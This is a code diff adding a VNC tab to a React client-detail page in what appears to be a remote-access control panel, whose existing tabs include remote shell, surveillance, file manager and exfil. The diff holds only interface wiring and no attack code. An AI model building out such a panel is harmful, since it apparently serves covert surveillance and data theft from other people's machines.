@@ -6,16 +6,17 @@ import { Badge } from "@/components/ui/badge";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Skeleton } from "@/components/ui/skeleton";
-import { Monitor, Cpu, TerminalSquare, FolderOpen, Eye, Settings, ArrowLeft, Database } from "lucide-react";
+import { Monitor, Cpu, TerminalSquare, FolderOpen, Eye, Settings, ArrowLeft, Database, MonitorPlay } from "lucide-react";
 import SystemInfoTab from "@/components/client/SystemInfoTab";
 import RemoteShellTab from "@/components/client/RemoteShellTab";
 import FileManagerTab from "@/components/client/FileManagerTab";
 import SurveillanceTab from "@/components/client/SurveillanceTab";
 import ControlTab from "@/components/client/ControlTab";
 import ExfilTab from "@/components/client/ExfilTab";
+import VNCTab from "@/components/client/VNCTab";
 import { formatDistanceToNow } from "date-fns";
 
-const VALID_TABS = ["sysinfo", "shell", "surveillance", "files", "exfil", "control"] as const;
+const VALID_TABS = ["sysinfo", "shell", "surveillance", "files", "exfil", "control", "vnc"] as const;
 
 function isOnline(lastSeen: string | null) {
   if (!lastSeen) return false;
@@ -152,6 +153,9 @@ const ClientDetail = () => {
           <TabsTrigger value="control" className="gap-1.5 text-xs data-[state=active]:bg-card">
             <Settings className="w-3.5 h-3.5" /> Control
           </TabsTrigger>
+          <TabsTrigger value="vnc" className="gap-1.5 text-xs data-[state=active]:bg-card">
+            <MonitorPlay className="w-3.5 h-3.5" /> VNC
+          </TabsTrigger>
         </TabsList>
 
         <TabsContent value="sysinfo">
@@ -171,6 +175,9 @@ const ClientDetail = () => {
         </TabsContent>
         <TabsContent value="control">
           <ControlTab machineId={client.machine_id} machineName={client.machine_name || client.machine_id} />
+        </TabsContent>
+        <TabsContent value="vnc">
+          <VNCTab machineId={client.machine_id} machineName={client.machine_name || client.machine_id} />
         </TabsContent>
       </Tabs>
     </div>
